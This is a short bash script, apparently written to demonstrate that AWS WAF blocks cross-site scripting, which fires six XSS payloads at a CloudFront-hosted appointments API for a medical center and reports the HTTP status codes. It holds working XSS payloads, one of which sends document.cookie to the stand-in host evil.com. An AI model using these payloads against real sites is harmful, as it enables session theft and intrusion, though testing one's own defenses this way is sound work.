#!/usr/bin/env bash
# ============================================================
# ATTACK SCRIPT 1: XSS (Cross-Site Scripting) payloads
# Target: Al-Kausar Medical Center (CloudFront edge + API)
# Defense shown: AWS WAF Common Rule Set (XSS rules) -> 403
# ============================================================
BASE="https://d3sh4djt5tzbsr.cloudfront.net"
echo "============================================================"
echo "ATTACK 1: Stored/Reflected XSS attempts"
echo "Expect: AWS WAF blocks each with HTTP 403"
echo "============================================================"

PAYLOADS=(
  "<script>alert(document.cookie)</script>"
  "<script>fetch('//evil.com?c='+document.cookie)</script>"
  "<img src=x onerror=alert(1)>"
  "<svg/onload=alert('xss')>"
  "javascript:alert(document.domain)"
  "';alert(String.fromCharCode(88,83,83));//'"
)

i=0
for p in "${PAYLOADS[@]}"; do
  i=$((i+1))
  enc=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))" "$p")
  code=$(curl -s -o /dev/null -w "%{http_code}" "${BASE}/api/appointments?q=${enc}")
  printf "  payload %d: %-55s -> HTTP %s\n" "$i" "${p:0:50}" "$code"
done

# XSS in request body
code=$(curl -s -o /dev/null -w "%{http_code}" -X POST "${BASE}/api/appointments" \
  -H "Content-Type: application/json" --data '{"q":"<script>alert(1)</script>"}')
printf "  body XSS: %-55s -> HTTP %s\n" "<script>alert(1)</script>" "$code"

echo ""
echo "Result: any 403 = blocked by AWS WAF XSS managed rules."
echo "Any 200 = payload reached the app (should not happen)."
echo ""